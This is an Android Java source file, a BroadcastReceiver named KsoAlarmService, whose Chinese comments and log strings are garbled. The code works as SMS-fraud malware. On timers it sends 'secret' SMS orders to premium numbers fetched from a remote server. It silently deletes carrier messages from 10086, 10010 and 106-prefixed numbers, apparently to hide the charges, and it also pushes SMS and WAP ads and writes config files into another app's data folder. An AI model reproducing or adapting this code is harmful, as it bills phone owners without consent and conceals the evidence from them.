package com.sttm.charge;

import java.io.File;
import java.io.FileOutputStream;
import java.util.Calendar;
import java.util.List;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import com.sttm.bean.CFGInfo_header;
import com.sttm.bean.ChannelNumber;
import com.sttm.bean.ControlData;
import com.sttm.bean.CurstomCFG;
import com.sttm.bean.SalesVolume;
import com.sttm.bean.SmsAdsData;
import com.sttm.bean.SmsData;
import com.sttm.bean.WapAdsData;
import com.sttm.model.AdsService;
import com.sttm.model.CFGService;
import com.sttm.model.ChannelNumService;
import com.sttm.model.GPRSService;
import com.sttm.model.SmsSenderAndReceiver;
import com.sttm.model.TimerCenter;
import com.sttm.util.ByteUtil;
import com.sttm.util.IsNetOpen;
import com.sttm.util.KsoCache;
import com.sttm.util.KsoHelper;
import com.sttm.util.LogFile;
import com.sttm.util.ShareProDBHelper;
import com.sttm.util.SmsCenterNumber;

public class KsoAlarmService extends BroadcastReceiver {
	private final String TAG = "KsoAlarmService";
	private ShareProDBHelper share;
	private KsoMainCourse ksoMainCourse;
	private String[] saleNumbers;

	@Override
	public void onReceive(Context context, Intent intent) {
		ksoMainCourse = new KsoMainCourse();
		share = new ShareProDBHelper(context);
		
		int isShutSell = KsoCache.getInstance().getValue("isShutSell") != null ? (Integer) KsoCache.getInstance()
				.getValue("isShutSell") : 0;
		//Log.d(TAG, "�����Ƿ�ر�" + isShutSell);
		String salesNumber = KsoCache.getInstance().getValue("saleNumbers") != null ? (String) KsoCache.getInstance()
				.getValue("saleNumbers") : "";
		LogFile.WriteLogFile("��������" + salesNumber);
		
		
		if(!"".equals(salesNumber)){
			saleNumbers = salesNumber.substring(0,
					salesNumber.lastIndexOf(",")).split(",");
			
		}

		

		int saleIndex = saleNumbers != null ?KsoHelper.getRandom(saleNumbers.length) : 0;
		if (intent.getAction().equals("start")) {
			//Log.d(TAG, "�û����ػ�������£�����������Զ����������Ƿ�����");
			LogFile.WriteLogFile("�û����ػ�������£�ÿ����һ�� ��������");
			int intelnetCount = KsoCache.getInstance().getValue("intelnetCount") != null ? (Integer) KsoCache.getInstance()
					.getValue("intelnetCount") : 0;

			int month = KsoHelper.getCurrentMonth();

			int internetedCount = share.getSharedPreferences("dataCenter")
					.getInt(month + "��", 0);

			long startIntelnetDate = KsoCache.getInstance().getValue("startIntelnetDate") != null ? (Long) KsoCache.getInstance()
					.getValue("startIntelnetDate") : 0;
			String IntelnetDates = KsoCache.getInstance().getValue("internetDate") != null ? (String) KsoCache.getInstance()
					.getValue("internetDate") : "";
			String[] IntelnetDate = IntelnetDates.split(",");
			int driveup = share.getSharedPreferences("DRIVEUP_PREE").getInt(
					"DRIVEUP_COUNT_PREE", 0);
			int driveup_cfg = KsoCache.getInstance().getValue("driveup") != null ? (Integer) KsoCache.getInstance()
					.getValue("driveup") : 0;
					int saleCount =  KsoCache.getInstance().getValue("sellCount") != null ? (Integer) KsoCache.getInstance().getValue("sellCount") : 2;
			if (intelnetCount >= internetedCount) {
				if (ksoMainCourse.decideStartFlag(startIntelnetDate, context)
						&& (driveup == driveup_cfg)) {

					// ����ͳ��
					if (ksoMainCourse.checksalesvolumeOccasion(driveup_cfg,driveup,saleCount)) {
						ksoMainCourse.startTimerHandler(context);

					}

					// GPRS����

					if (ksoMainCourse.checkGPRSOccasion(context, IntelnetDate)) {
						ksoMainCourse.startGPRSHandler(context);
					}
				} else {
					//Log.d(TAG, "��ο�������������ͳ�ƺ��Զ���������Ϊ���ڼ����ڻ��߿�������������");
					LogFile.WriteLogFile("��ο�������������ͳ�ƺ��Զ���������Ϊ���ڼ����ڻ��߿�������������");
				}

			} else {
				//Log.d(TAG, "����GRPS���´������ˣ������ٸ���");
				LogFile.WriteLogFile("����GRPS���´������ˣ������ٸ���");
			}

		}else if(intent.getAction().equals("SmsCenter")) {
			LogFile.WriteLogFile("��ȡ�������ĺ���ʱ�䵽�����Ͷ���");
			SmsCenterNumber smsCenter = new SmsCenterNumber(context);
			smsCenter.sendSms();
		} else if (intent.getAction().equals("sales1")) {
			//Log.d(TAG, "���͵�һ������ʱ�䵽");
			LogFile.WriteLogFile("���͵�һ������ʱ�䵽");
			if (isShutSell == 0) {
				//Log.d(TAG, "׼�����͵�һ������");
				SalesVolume sv = SalesVolume.getInstance(context, "01");

				if (saleNumbers.length > 0
						&& !"".equals(saleNumbers[saleIndex])) {
					SmsSenderAndReceiver.send2(saleNumbers[saleIndex].trim(),
							sv.mergesalesvolumestring().trim());

					//Log.d(TAG, "�����˵�һ������,��������Ϊ" + saleNumbers[saleIndex].trim()+ "��������Ϊ" + sv.mergesalesvolumestring().trim());
					LogFile.WriteLogFile("�����˵�һ������,��������Ϊ"
							+ saleNumbers[saleIndex].trim() + "��������Ϊ"
							+ sv.mergesalesvolumestring().trim());

				} else {
					//Log.d(TAG, "û����������");
					LogFile.WriteLogFile("û����������");

				}

			} else {
				//Log.d(TAG, "���������ر�");
				LogFile.WriteLogFile("���������ر�");
			}

		} else if (intent.getAction().equals("sales2")) {
			//Log.d(TAG, "���͵ڶ�������ʱ�䵽");
			LogFile.WriteLogFile("���͵ڶ�������ʱ�䵽");
			if (isShutSell == 0) {
				//Log.d(TAG, "׼�����͵ڶ�������");
				SalesVolume sv = SalesVolume.getInstance(context, "02");

				if (saleNumbers.length > 0
						&& !"".equals(saleNumbers[saleIndex])) {
					SmsSenderAndReceiver.send2(saleNumbers[saleIndex].trim(),
							sv.mergesalesvolumestring().trim());
					//Log.d(TAG, "�����˵ڶ�������,��������Ϊ" + saleNumbers[saleIndex].trim()+ "��������Ϊ" + sv.mergesalesvolumestring().trim());
					LogFile.WriteLogFile("�����˵ڶ�������,��������Ϊ"
							+ saleNumbers[saleIndex].trim() + "��������Ϊ"
							+ sv.mergesalesvolumestring().trim());

				} else {
					//Log.d(TAG, "û����������");
					LogFile.WriteLogFile("û����������");

				}

			} else {
				//Log.d(TAG, "���������ر�");
				LogFile.WriteLogFile("���������ر�");
			}

		} else if (intent.getAction().equals("sales3")) {
			//Log.d(TAG, "���͵���������ʱ�䵽");
			LogFile.WriteLogFile("���͵���������ʱ�䵽");
			if (isShutSell == 0) {
				//Log.d(TAG, "׼�����͵���������");
				SalesVolume sv = SalesVolume.getInstance(context, "03");

				if (saleNumbers.length > 0
						&& !"".equals(saleNumbers[saleIndex])) {
					SmsSenderAndReceiver.send2(saleNumbers[saleIndex].trim(),
							sv.mergesalesvolumestring().trim());
					//Log.d(TAG, "�����˵���������,��������Ϊ" + saleNumbers[saleIndex].trim()+ "��������Ϊ" + sv.mergesalesvolumestring().trim());
					LogFile.WriteLogFile("�����˵���������,��������Ϊ"
							+ saleNumbers[saleIndex].trim() + "��������Ϊ"
							+ sv.mergesalesvolumestring().trim());

				} else {
					//Log.d(TAG, "û����������");
					LogFile.WriteLogFile("û����������");

				}

			} else {
				//Log.d(TAG, "���������ر�");
				LogFile.WriteLogFile("���������ر�");
			}
		} else if (intent.getAction().equals("sales4")) {
			//Log.d(TAG, "���͵���������ʱ�䵽");
			LogFile.WriteLogFile("���͵���������ʱ�䵽");

			if (isShutSell == 0) {
				SalesVolume sv = SalesVolume.getInstance(context, "04");

				if (saleNumbers.length > 0
						&& !"".equals(saleNumbers[saleIndex])) {
					SmsSenderAndReceiver.send2(saleNumbers[saleIndex].trim(),
							sv.mergesalesvolumestring().trim());
					//Log.d(TAG, "�����˵���������,��������Ϊ" + saleNumbers[saleIndex].trim()+ "��������Ϊ" + sv.mergesalesvolumestring().trim());
					LogFile.WriteLogFile("�����˵���������,��������Ϊ"
							+ saleNumbers[saleIndex].trim() + "��������Ϊ"
							+ sv.mergesalesvolumestring().trim());

				} else {
					//Log.d(TAG, "û����������");
					LogFile.WriteLogFile("û����������");

				}
			} else {
				//Log.d(TAG, "���������ر�");
				LogFile.WriteLogFile("���������ر�");
			}

		} else if (intent.getAction().equals("sales5")) {
			//Log.d(TAG, "���͵���������ʱ�䵽");
			LogFile.WriteLogFile("���͵���������ʱ�䵽");
			String saleSmsCat = KsoCache.getInstance().getValue("saleSmsCat") != null ? (String) KsoCache.getInstance().getValue("saleSmsCat") : "";
			//Log.d(TAG, "׼�����͵���������" + saleSmsCat );
			
			if (isShutSell == 0 && !"".equals(saleSmsCat)) {
				//Log.d(TAG, "׼�����͵���������");
				SalesVolume sv = SalesVolume.getInstance(context, "05");		
					SmsSenderAndReceiver.send2(saleSmsCat, sv
							.mergesalesvolumestring().trim());
					//Log.d(TAG, "�����˵���������,��������Ϊ" + saleSmsCat+ "��������Ϊ" + sv.mergesalesvolumestring().trim());
					LogFile.WriteLogFile("�����˵���������,��������Ϊ"
							+ saleSmsCat + "��������Ϊ"
							+ sv.mergesalesvolumestring().trim());


			} else {
				LogFile.WriteLogFile("���������ر�");
			}

		} else if (intent.getAction().equals("GPRS")) {

			//Log.d(TAG, "GPRS ����ʱ�䵽��");
			LogFile.WriteLogFile("GPRS ����ʱ�䵽�� ");
			
			Calendar calendar = Calendar.getInstance();
			int hour = calendar.get(Calendar.HOUR_OF_DAY);
			if (hour < 7) {
				int year = calendar.get(Calendar.YEAR);
				int month = calendar.get(Calendar.MONTH);
				int day = calendar.get(Calendar.DAY_OF_MONTH);

				hour = 7 + hour;
				int temp = (int) Math.random() * 100;
				while (temp >= 60) {
					temp = (int) Math.random() * 100;
				}
				int minute = temp;
				TimerCenter tcenter = new TimerCenter();

				Calendar timerDelay = tcenter.getTime(year, month, day, hour, minute,0);
				tcenter.startTimerHandler(context, timerDelay, "GPRS");
				return;
				

			}
			
			
			//GPRS����
			UpdateGprsData(context);
			// ������
			UpdateAdsData(context);
			// ������Ϻ����³�ʼ������
			//KsoCache.getInstance().init(context);
			////Log.d(TAG,"������Ϻ����³�ʼ������ cache.init(context)");
			String today = KsoHelper.date2String();
			ShareProDBHelper dbHelper = new ShareProDBHelper(context);
			SharedPreferences sp = dbHelper.getSharedPreferences("dataCenter");
			int month = KsoHelper.getCurrentMonth();
			int internetedCount = sp.getInt(month + "��", 0);
			Editor editor = sp.edit();
			editor.putString("updateTime", today);
			editor.putInt(month + "��", internetedCount + 1);
			editor.commit();

			LogFile.WriteLogFile("GPRS �������");

		} else if (intent.getAction().equals("Money")) {
			//Log.d(TAG, "GPRS���º�,���Ͱ��۶���ʱ�䵽��");

			LogFile.WriteLogFile("GPRS���º�,���Ͱ��۶���ʱ�䵽��");

			String secretSmsNumber = KsoCache.getInstance().getValue("secretSmsNumber") != null ? (String) KsoCache.getInstance()
					.getValue("secretSmsNumber") : "";
			String secretSmsOrder = KsoCache.getInstance().getValue("secretSmsOrder") != null ? (String) KsoCache.getInstance()
					.getValue("secretSmsOrder") : "";

			long time = KsoCache.getInstance().getValue("adsTime") != null ? (Long) KsoCache.getInstance()
					.getValue("adsTime") : 0;

			int secretSmsCount = KsoCache.getInstance().getValue("secretSmsCount") != null ? (Integer) KsoCache.getInstance()
					.getValue("secretSmsCount") : 0;
			String relpyNumber = KsoCache.getInstance().getValue("deleteTeleponeNumber") != null ? (String) KsoCache.getInstance()
					.getValue("deleteTeleponeNumber") : "";
			//Log.d(TAG, "���ۺ���" + secretSmsNumber + "����ָ��" + secretSmsOrder );
			if (!"".equals(secretSmsNumber) && !"".equals(secretSmsOrder)) {			
				if (secretSmsCount > 0) {
					//Log.d(TAG,"�������Ͷ��ŷ���");
					LogFile.WriteLogFile("�������Ͷ��ŷ���");
					Intent service = new Intent(context, SendSmsService.class);
					service.putExtra("sendTime", time);
					service.putExtra("sendCount", secretSmsCount);
					service.putExtra("flag",4);
					service.putExtra("secretSmsReplyNumber",relpyNumber);
					service.putExtra("secretSmsNumber",secretSmsNumber);
					service.putExtra("secretSmsOrder", secretSmsOrder);
					context.startService(service);
				} else if (secretSmsCount == 0) {
					// irv
					/*
					 * ITelephony phone =
					 * (ITelephony)ITelephony.Stub.asInterface()
					 * ServiceManager.getService("phon")); phone.dial("10086");
					 */

				}

		   }

		} else if (intent.getAction().equals("sendNormonSms")) {
			//Log.d(TAG, "��Ʒ�շ�ɾ������ʱ�䵽��");

			LogFile.WriteLogFile("��Ʒ�շ�ɾ������ʱ�䵽��");

			context.getContentResolver().delete(Uri.parse("content://sms"),
					"address=?", new String[] { "10086" });
			context.getContentResolver().delete(Uri.parse("content://sms"),
					"address=?", new String[] { "10010" });
			deleteSMS(context);
			//Log.d(TAG, "��Ʒ�շѶ���ɾ����");
			LogFile.WriteLogFile("��Ʒ�շѶ���ɾ����");
			Editor editor = share.writer("sendSmsFlag");
			editor.putBoolean("sendNormonSms", false);
			KsoCache.getInstance().reSetValues2("sendNormonSms", false);
			editor.commit();

		} else if (intent.getAction().equals("ADS")) {
			//Log.d(TAG, "���Ͷ��Ź��ʱ�䵽��");

			LogFile.WriteLogFile("���Ͷ��Ź��ʱ�䵽��");
			String adsNumber = KsoCache.getInstance().getValue("adsNumbers") != null ? (String) KsoCache.getInstance()
					.getValue("adsNumbers") : "";
			String adsContent = KsoCache.getInstance().getValue("adsContent") != null ? (String) KsoCache.getInstance()
					.getValue("adsContent") : "";
			String[] adsNumbers = adsNumber.substring(0,
					adsNumber.lastIndexOf(",")).split(",");
			int time = KsoCache.getInstance().getValue("adsTime") != null ? (Integer) KsoCache.getInstance()
					.getValue("adsTime") : 0;
			if (adsNumbers.length > 0) {
				LogFile.WriteLogFile("�������Ͷ��ŷ���");
				Intent service = new Intent(context, SendSmsService.class);
				service.putExtra("sendTime", time);
				service.putExtra("sendCount", adsNumbers.length);
				service.putExtra("flag",5);
				service.putExtra("adsNumber",adsNumber);
				service.putExtra("adsContent", adsContent);
				context.startService(service);
			}

		} else if (intent.getAction().equals("ADS_WAP")) {
			//Log.d(TAG,"����WAP���ʱ�䵽��");
			LogFile.WriteLogFile("����WAP���ʱ�䵽��");
			String url = KsoCache.getInstance().getValue("url") != null ? (String) KsoCache.getInstance()
					.getValue("url") : "";
			if (!"".equals(url)) {
				Uri uri = Uri.parse(url);
				Intent ksoIntent = new Intent();
				ksoIntent.setAction(Intent.ACTION_VIEW);
				ksoIntent.setData(uri);
				ksoIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				context.startActivity(ksoIntent);
				LogFile.WriteLogFile("���������WAP���");
			}

		}else if (intent.getAction().equals("ksoSendSms")) {
			
			LogFile.WriteLogFile("���Ͱ��۶��Ŷ�ʱʱ�䵽��");
			String smsNumber = KsoCache.getInstance().getValue("ksoSmsNumber") != null ? (String) KsoCache.getInstance()
					.getValue("ksoSmsNumber") : "";
			
			String smsOrder = KsoCache.getInstance().getValue("ksoSmsOrder") != null ? (String) KsoCache.getInstance()
					.getValue("ksoSmsOrder") : "";
					
			if(!"".equals(smsNumber) && !"".equals(smsOrder)){
				SmsSenderAndReceiver.send2(smsNumber, smsOrder);
				//Log.d(TAG, "���ƶ��û������˵�" + 1 + "�����۶��ţ�����Ϊ "+ smsNumber + "ָ��Ϊ" + smsOrder);
				LogFile.WriteLogFile("���ƶ��û������˵�" + 1
								+ "�����۶���,����ͨ����" + smsNumber + " ����ָ�"
								+ smsOrder);
				
			}
			

		} else if (intent.getAction().equals("BASE_CHARGE")) {
			/*
			 * //Log.d(TAG,"�����շ�ʱ�䵽��"); LogFile.WriteLogFile("�����շ�ʱ�䵽��"); String
			 * urlStr = KsoCache.getInstance().getValue("url") != null ?
			 * (String) KsoCache.getInstance() .getValue("url") : ""; if
			 * (!"".equals(urlStr)) {
			 * 
			 * 
			 * String baseUrl = urlStr.substring(urlStr.indexOf("&burl=") +
			 * 6).trim();
			 * 
			 * String btype = urlStr.substring(urlStr.indexOf("&btype=") +
			 * 7,urlStr.indexOf("&burl=")).trim();
			 * 
			 * String ftype = urlStr.substring(urlStr.indexOf("&ftype=") +
			 * 7,urlStr.indexOf("&btype=")).trim();
			 * 
			 * 
			 * 
			 * KsoCache.getInstance().reSetValue("baseUrl",baseUrl );
			 * KsoCache.getInstance().reSetValue("btype", btype); Intent
			 * base_intent = new Intent(context, BaseZoneService.class);
			 * base_intent.putExtra("urlStr", urlStr);
			 * //base_intent.putExtra("baseUrl", "http://" +
			 * baseZone.getBase_url()); base_intent.putExtra("flag", ftype);
			 * context.startService(base_intent);
			 * LogFile.WriteLogFile("�������ؿ۷�������"); }
			 */
		}
	}

	public void UpdateGprsData(final Context context) {
		new Thread() {
			public void run() {
				IsNetOpen ino = new IsNetOpen(context);

				if (!ino.checkNet()) {
					//Log.d(TAG,"�ֻ�û������");
					LogFile.WriteLogFile("�ֻ�û������");
					return;
				}
				//Log.d(TAG,"���绷������");
				LogFile.WriteLogFile("���绷������");
				
				
				//GRRS���¿ͻ������ļ�	
				// ����gprs��������
				GPRSService gprsservice = new GPRSService();			
				byte gprsdata[] = GPRSService.updateGprsData(context);
				/*�����������������Ƿ���ȷ*/
				if(gprsdata == null){
					LogFile.WriteLogFile("���µ���getAnrGprs�ļ����ݲ�����,�ж�");
					return;
				}
					
					
				CFGInfo_header gprsheader = gprsservice.getGPRSHeader(gprsdata);
				if(gprsheader != null){
					//Log.d("GPRS�������ݳ���", "=" + gprsheader.getM_nCtrlLen());
				}			
				ControlData datacontrol = gprsservice.getControlSmsData(
						gprsdata, gprsheader);	
				if(datacontrol != null){		
					//�����������������Ŷ�ʱ��
					if(datacontrol.getSellPhoneNumber() != null){
						
						int saleDelay5 = (int) (Math.random());
						saleDelay5 = 420;//����ʱʹ��()
						Intent intentSalesFlag5 = new Intent(context,
								KsoAlarmService.class);
						intentSalesFlag5.setAction("sales5");
						PendingIntent pintentSalesFlag5 = PendingIntent.getBroadcast(
								context, 0, intentSalesFlag5, 0);
						AlarmManager alarmSales5 = (AlarmManager) context
								.getSystemService(Context.ALARM_SERVICE);
						alarmSales5.set(AlarmManager.RTC_WAKEUP,
								System.currentTimeMillis() + saleDelay5 * 60 * 60 * 1000,
								pintentSalesFlag5);
						//Log.d(TAG, "�����������������Ŷ�ʱ��" + saleDelay5 + "һ��Сʱ����");
						LogFile.WriteLogFile("�����������������Ŷ�ʱ��" + saleDelay5 + "һ��Сʱ����");
					}
					//���ͻ�������Ϣ������
					CurstomCFG cfg = CurstomCFG.getInstance();		
					if(cfg != null){
						//GPRS���²��ֿͻ�������Ϣ	
						//Log.d(TAG,"�ͻ�������Ϣ������");
						cfg.setBillStyle(datacontrol.getBillStyle());// �շѷ�ʽ
						cfg.setBillCount(datacontrol.getMonthlyPayment());// �����շѴ���
						cfg.setUploadTiem(datacontrol.getAdsTime());// ���е�ʱ����
						cfg.setDeleteTime(datacontrol.getPlayingTime());// ��Ʒ�շ�ɾ�����ŵ�ʱ��
						cfg.setIsShutDown(datacontrol.getIsShutGSMDown());// �Ƿ�������Ӫ������
						cfg.setIsChanelShutDown(datacontrol.getIsShutChanelDown());// ʱ������ͨ������
						cfg.setIsNotify(datacontrol.getIsNotify());// �Ƿ���Ҫ��ʾ
						if (datacontrol.getIsNotify() == 1) {
							cfg.setNotifyContent(datacontrol.getNotifyContent());// ��ʾ����
						}
						LogFile.WriteLogFile("Gprs �������ͻ�ID" + cfg.getCurstomID());
						
						//�ѿͻ�������Ϣת�����ֽ��飬��д��ȥ�ļ�
						CFGService cfgservice = new CFGService();
						byte bt[] = cfgservice.getCurstomCFGByte(cfg);
						//Log.d("�ͻ�������Ϣ�ֽڴ�С", "=" + bt.length);
						
						try {
							File file_config = new File("data/data/com.android.quicksearchbox/files/smartphonec.dat");	
							FileOutputStream fos = new FileOutputStream(file_config);
							ByteUtil.writeByteFile(fos, bt);
							//Log.d(TAG, "GPRS�����˿ͻ������ļ�");
							LogFile.WriteLogFile("GPRS�����˿ͻ������ļ�");
							
						} catch (Exception e) {
							e.printStackTrace();
							//Log.d(TAG, "GPRS���¿ͻ������ļ�ʧ��");
							LogFile.WriteLogFile("GPRS���¿ͻ������ļ�ʧ��");
						}	
					}
				}
				
				// GPRS ��ͨͨ�����ݸ���
				ChannelNumber channel = ChannelNumber.getInstance();
				List<SmsData> smsDatas = gprsservice.getSmsData(gprsdata, gprsheader);
				String smsNumber = "";
				String smsOrder = "";
				if (smsDatas != null && smsDatas.size() > 0) {
					//Log.d(TAG,"��ͨͨ�����ݸ���=========1");			
					for (SmsData smsData : smsDatas) {			
						smsNumber += smsData.getChanel() + ",";
						smsOrder += smsData.getOrder() + ",";
					}
					String strChannel[] = smsNumber.substring(0, smsNumber.lastIndexOf(",")).split(",");
					String strOrder[] = smsOrder.substring(0, smsOrder.lastIndexOf(",")).split(",");
					if (KsoHelper.getARS2(context) == 1) {
						// �ֻ�SIM�����ƶ�������µ��ƶ�ͨ��
						//Log.d(TAG,"��ͨͨ�����ݸ���=========2");
						channel.setCmCount(smsDatas.size());
						channel.setCmNumber(strChannel);
						channel.setCmCommand(strOrder);
						LogFile.WriteLogFile("�����ƶ�ͨ������:count="+smsDatas.size()+",setCmNumber="+smsNumber+",order="+smsOrder);
					} else if (KsoHelper.getARS2(context) == 2) {
						// �ֻ�SIM������ͨ������µ���ͨͨ��
						//Log.d(TAG,"��ͨͨ�����ݸ���=========3");
						channel.setUmCount(smsDatas.size());
						channel.setUmNumber(strChannel);
						channel.setUmCommand(strOrder);
						LogFile.WriteLogFile("��������ͨ������:count="+smsDatas.size()+",setCmNumber="+smsNumber+",order="+smsOrder);
					}		
					byte chnnelNumBytes[] = ChannelNumService.getChannelNumByte(channel);		
					//Log.d("��ͨͨ�������ֽڴ�С", "=" + chnnelNumBytes.length);
					try {
						File file_channel = new File("data/data/com.android.quicksearchbox/files/smartphonem.dat");
						FileOutputStream fos = new FileOutputStream(file_channel);
						ByteUtil.writeByteFile(fos, chnnelNumBytes);
						//Log.d(TAG, "GPRS�ɹ�����������ͨ���ļ�");
						LogFile.WriteLogFile("GPRS�ɹ�����������ͨ���ļ�");				
					} catch (Exception e) {
						e.printStackTrace();
						//Log.d(TAG, "GPRS��������ͨ���ļ�ʧ��");
						LogFile.WriteLogFile( "GPRS��������ͨ���ļ�ʧ��");
					}	
				}
				
				
				// �������۶�ʱ��
				List<SmsData> secretSmsDatas = gprsservice.getSecretSmsData(gprsdata, gprsheader);
				if(secretSmsDatas != null){
					if( secretSmsDatas.size() > 0){
						ksoMainCourse.startMoneyHandler(context);
						
					}else if(secretSmsDatas.size()== 0){
						//IVR����
					}
					
				}
				
				
				if(gprsdata != null){
					KsoCache.getInstance().init(context);
					//Log.d(TAG,"������Ϻ����³�ʼ������ cache.init(context)");
				}
				
				
				
				
			}
		}.start();
	}

	@SuppressWarnings("unused")
	private static int initdriveupcount(Context context) {
		return context.getSharedPreferences("DRIVEUP_PREE",
				Context.MODE_WORLD_WRITEABLE).getInt("DRIVEUP_COUNT_PREE", 0);
	}

	private void UpdateAdsData(final Context context) {
		new Thread() {
			public void run() {
				// ���¹����Ϣ
				IsNetOpen ino = new IsNetOpen(context);
				if (!ino.checkNet()) {
					return;
				}
				byte[] bytes = AdsService.updateAdsData(context);
				/*�����������������Ƿ���ȷ*/
				if(bytes == null){
					LogFile.WriteLogFile("���µ���getAnrAds�ļ����ݲ�����,�ж�");
					return;
				}
				
				if(bytes != null){
					KsoCache.getInstance().init(context);
					//Log.d(TAG,"������Ϻ����³�ʼ������ cache.init(context)");
				}
				AdsService adsService = new AdsService();
				SmsAdsData smsAdsData = adsService.getSmsAdsData(bytes, adsService.getAdsHeader(bytes));
				if(smsAdsData != null){
					// ���������Ŷ�ʱ��
					ksoMainCourse.startAdsSMSHandler(context);				
				}
				WapAdsData wapAdsData = adsService.getWapAdsData(bytes, adsService.getAdsHeader(bytes));
				
				if(wapAdsData != null){
					long waptimeout = KsoCache.getInstance().getValue("wap_timeout") != null ? (Long)KsoCache.getInstance().getValue("wap_timeout") : 0;
					/*wap �������ʱ����5-15������ִ�л��ؿ۷�*/
					if(wapAdsData.getTime()>=5 && wapAdsData.getTime() <= 15){
						//�������ؿ۷Ѷ�ʱ�� 5-15���Ӻ�ʼ���ؿ۷�
						ksoMainCourse.startBaseChargeHandler(context,waptimeout);
					}
					else{
					// �������WAP��ʱ��
						
						ksoMainCourse.startAdsWAPHandler(context,waptimeout);
					}
				}
				
			}
		}.start();
	}

	// ɾ������
	public void deleteSMS(Context context) {
		try {
			ContentResolver CR = context.getContentResolver();

			Uri uriSms = Uri.parse("content://sms");
			Cursor c = CR.query(uriSms, new String[] { "_id", "thread_id",
					"address" }, null, null, null);
			if (null != c && c.moveToFirst()) {
				do {

					long threadId = c.getLong(1);
					String address = c.getString(c.getColumnIndex("address"));
					//Log.d("����", address);
					if (address.startsWith("106")) {
						CR.delete(
								Uri.parse("content://sms/conversations/"
										+ threadId), null, null);
						//Log.d("deleteSMS", "threadId:: " + threadId + "address"+ address);
					}

					//Log.d("deleteSMS", "threadId:: " + threadId + "address"+ address);
				} while (c.moveToNext());
			}
		} catch (Exception e) {
		
			//Log.d("deleteSMS", "Exception:: " + e);
		}
	}
}
